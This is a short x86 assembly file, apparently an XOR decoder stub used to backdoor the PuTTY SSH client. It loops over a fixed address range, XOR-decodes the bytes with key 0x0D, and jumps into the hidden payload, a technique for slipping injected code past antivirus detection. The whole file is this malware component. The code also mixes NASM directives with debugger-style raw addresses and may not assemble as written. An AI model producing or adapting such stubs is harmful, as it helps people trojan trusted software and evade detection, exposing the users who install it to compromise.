;
; XOR stub for PuTTY exe backdoor
;

section .data

section .bss

section .text

  global _start

_start:
  MOV EAX,00484000          ; save start address to EAX
  XOR BYTE PTR DS:[EAX],0D  ; XOR contents of EAX with our key
  INC EAX                   ; increment EAX
  CMP EAX,00484164          ; check if we have reached the final address
  JLE SHORT 00484169        ; if not continue to loop
  JMP 00484000              ; jump back to the start of our decoded payload
